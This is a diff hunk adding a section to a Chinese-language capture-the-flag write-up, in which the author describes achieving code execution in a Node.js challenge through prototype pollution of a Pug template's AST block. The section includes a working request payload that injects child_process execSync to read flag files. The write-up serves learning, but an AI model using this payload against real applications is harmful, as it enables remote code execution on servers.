@@ -291,12 +291,37 @@ let data = {
 
 那，該怎麽做呢？
 
+又是經過一大串的研究，後來發現可以在編譯過的 Pug 模板函數 (`template`) 實現注入  
+（其實這裏原本寫很多，但是之前操作失誤，不小心回退版本...）  
+（請原諒我現在這裡只能草草帶過）
+
+總之就是修改請求資料，像是這樣：
+[request-pug3.js](scripts/request-pug3.js)
+```js
+// 瀏覽器請求的片段
+let data = {
+    "artist.name": "Haigh",
+    "__proto__.block": {
+        "type": "Text",
+        "line": "1; pug_html += `[${process.mainModule.require('child_process').execSync(`cat flag*`).toString()}]`;"
+    }
+};
+```
+
+這個請求送出後， PUG 會編譯出這個模板函式 [scirpts/pug-compiled-template.js](scripts/pug-compiled-template.js)
+
+請求結果看起來就像這樣  
+![](images/9.png)
 
 
+## 尾聲
+終於成功了。  
+由於我是衝着 VERY EASY 來解題的，這一路走過來花了我一個多月...  
+到底是誰標 VERY EASY 的，最好別讓我知道他家地址。  
+![](images/10.png)
 
-
-
-
+總之，生氣歸生氣，最後看到這個畫面還是忍不住暖了眼眶（？）  
+![](images/11.png)
 
 ****
 ## 雜談
